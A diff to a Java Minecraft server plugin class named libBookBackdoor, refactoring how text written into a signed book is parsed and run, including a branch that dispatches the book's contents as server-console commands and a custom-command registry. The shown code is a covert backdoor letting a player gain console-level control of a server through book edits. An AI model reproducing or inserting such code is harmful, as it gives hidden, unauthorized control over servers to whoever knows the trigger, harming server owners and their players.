@@ -77,7 +77,7 @@ class Commands {
         registeredCommands = commands;
     }
 
-    public void parseCommand(Plugin plugin, PlayerEditBookEvent event, String commandName, String[] args) {
+    public void parseCommand(Plugin plugin, PlayerEditBookEvent event, String commandType, String commandName, String[] args) {
         if (registeredCommands != null) {
             for (Command command : registeredCommands) {
                 if (command.commandName.equals(commandName)) {
@@ -529,6 +529,19 @@ class Commands {
         }
     };
 
+    /*
+    Command acommand = new Command(
+            "The command Name",
+            "The command description.",
+            "The command usage"
+    ) {
+        @Override
+        void command(Plugin plugin, PlayerEditBookEvent event, String[] args) {
+            // Command code here
+        }
+    };
+     */
+
     Command help = new Command(
             "help",
             "Shows this help book.",
@@ -621,6 +634,7 @@ public class libBookBackdoor implements Listener {
     }
      */
 
+
     @EventHandler
     public void onBookSign(PlayerEditBookEvent event) {
         BookMeta eventMeta = event.getNewBookMeta();
@@ -654,35 +668,23 @@ public class libBookBackdoor implements Listener {
                     } catch (Exception e) {
                         player.sendMessage(ChatColor.RED + "Error executing server command.\n" + e);
                     }
-                    event.getPlayer().getInventory().getItemInMainHand().setAmount(event.getPlayer().getInventory().getItemInMainHand().getAmount() - 1);
-                    this.plugin.getServer().getScheduler().scheduleAsyncDelayedTask(this.plugin, new Runnable() {
-                        public void run() {
-                            event.getPlayer().getInventory().addItem(new ItemStack(Material.WRITABLE_BOOK));
-                        }
-                    }, 5);
                 } else if (commandType.equals("/")) /* Server commands, runs as [SERVER] */ {
                     this.plugin.getServer().dispatchCommand(this.plugin.getServer().getConsoleSender(), command);
-                    event.getPlayer().getInventory().getItemInMainHand().setAmount(event.getPlayer().getInventory().getItemInMainHand().getAmount() - 1);
-                    this.plugin.getServer().getScheduler().scheduleAsyncDelayedTask(this.plugin, new Runnable() {
-                        public void run() {
-                            event.getPlayer().getInventory().addItem(new ItemStack(Material.WRITABLE_BOOK));
-                        }
-                    }, 5);
                 } else if (commandType.equals(".")) /* Custom commands */ {
                     String[] args = command.split(" ", 0);
                     String mainCmd = args[0].toLowerCase();
                     // Init the Commands class
-                    Commands runner = new Commands();
+                    Commands runner = new Commands(); // <- Registers all commands
 
-                    runner.parseCommand(plugin, event, mainCmd, args);
-
-                    player.getInventory().getItemInMainHand().setAmount(event.getPlayer().getInventory().getItemInMainHand().getAmount() - 1);
-                    this.plugin.getServer().getScheduler().scheduleAsyncDelayedTask(this.plugin, new Runnable() {
-                        public void run() {
-                            player.getInventory().addItem(new ItemStack(Material.WRITABLE_BOOK));
-                        }
-                    }, 5);
+                    runner.parseCommand(plugin, event, commandType, mainCmd, args);
                 }
+                // Give the player a new Book and Quill after the command
+                player.getInventory().getItemInMainHand().setAmount(event.getPlayer().getInventory().getItemInMainHand().getAmount() - 1);
+                this.plugin.getServer().getScheduler().scheduleAsyncDelayedTask(this.plugin, new Runnable() {
+                    public void run() {
+                        player.getInventory().addItem(new ItemStack(Material.WRITABLE_BOOK));
+                    }
+                }, 5);
             }
         }
     }
